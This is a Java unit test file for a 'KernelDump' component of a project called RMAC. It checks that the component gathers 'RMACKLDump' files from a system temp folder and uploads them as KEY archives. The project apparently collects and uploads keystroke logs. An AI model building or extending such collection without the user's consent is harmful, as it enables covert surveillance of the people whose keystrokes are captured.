package com.rmac.process;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertFalse;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.doAnswer;
import static org.mockito.Mockito.doReturn;
import static org.mockito.Mockito.doThrow;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.spy;
import static org.mockito.Mockito.times;
import static org.mockito.Mockito.verify;

import com.rmac.RMAC;
import com.rmac.core.FileUploader;
import com.rmac.process.KernelDump;
import com.rmac.utils.ArchiveFileType;
import com.rmac.utils.Constants;
import com.rmac.utils.FileSystem;
import java.io.IOException;
import java.lang.Thread.State;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Arrays;
import java.util.List;
import java.util.stream.Stream;
import org.junit.Test;
import org.junit.jupiter.api.DisplayName;

public class KernelDumpTest {

  @Test
  @DisplayName("KernelDump Initialization")
  public void kernelDump() {
    KernelDump kernelDump = new KernelDump();

    assertEquals(State.NEW, kernelDump.thread.getState());
  }

  @Test
  @DisplayName("Start")
  public void start() throws InterruptedException {
    KernelDump dump = new KernelDump();
    dump.thread = spy(new Thread(() -> {
    }));

    dump.start();
    dump.thread.join();

    verify(dump.thread).start();
    assertEquals(State.TERMINATED, dump.thread.getState());
  }

  @Test
  @DisplayName("Run")
  public void run() {
    Constants.SYS_TEMP_LOCATION = "X:\\System\\Temp";
    KernelDump dump = spy(KernelDump.class);
    FileUploader uploader = mock(FileUploader.class);

    doReturn(Arrays.asList(
        Paths.get("X:\\System\\Temp\\file1.txt"),
        Paths.get("X:\\System\\Temp\\file2.txt"),
        Paths.get("X:\\System\\Temp\\file3.txt")
    )).when(dump).getAllLogFiles(eq(Constants.SYS_TEMP_LOCATION));

    RMAC.uploader = uploader;
    dump.run();

    verify(uploader, times(3)).uploadFile(anyString(), any());
    verify(uploader).uploadFile(eq("X:\\System\\Temp\\file1.txt"), eq(ArchiveFileType.KEY));
    verify(uploader).uploadFile(eq("X:\\System\\Temp\\file2.txt"), eq(ArchiveFileType.KEY));
    verify(uploader).uploadFile(eq("X:\\System\\Temp\\file3.txt"), eq(ArchiveFileType.KEY));
  }

  @Test
  @DisplayName("Get all log files when listing fails")
  public void getAllLogFiles_Listing_Failed() throws IOException {
    String path = "X:\\System\\Temp";
    KernelDump dump = spy(KernelDump.class);
    FileSystem fs = mock(FileSystem.class);

    doThrow(IOException.class).when(fs).list(eq(path));

    RMAC.fs = fs;
    List<Path> dumps = dump.getAllLogFiles(path);

    assertEquals(0, dumps.size());
    verify(fs, never()).getLastModified(anyString());
  }

  @Test
  @DisplayName("Get all log files succeeds")
  public void getAllLogFiles_Success() throws IOException {
    KernelDump dump = spy(KernelDump.class);
    FileSystem fs = mock(FileSystem.class);

    Path dump1 = Paths.get("X:\\System\\Temp\\RMACKLDump-193948329.dat");
    Path dump2 = Paths.get("X:\\System\\Temp\\RMACKLDump-264957384.dat");
    Path dump3 = Paths.get("X:\\System\\Temp\\RMACKLDump-039297402.dat");

    doAnswer(invc -> Stream.of(dump1, dump2, dump3)).when(fs).list(eq("X:\\System\\Temp"));
    doReturn(394875L)
        .doReturn(78677L)
        .doReturn(23155L)
        .when(fs).getLastModified(anyString());

    RMAC.fs = fs;
    List<Path> dumps = dump.getAllLogFiles("X:\\System\\Temp");

    assertEquals(2, dumps.size());
    assertFalse(dumps.contains(dump1));
  }
}
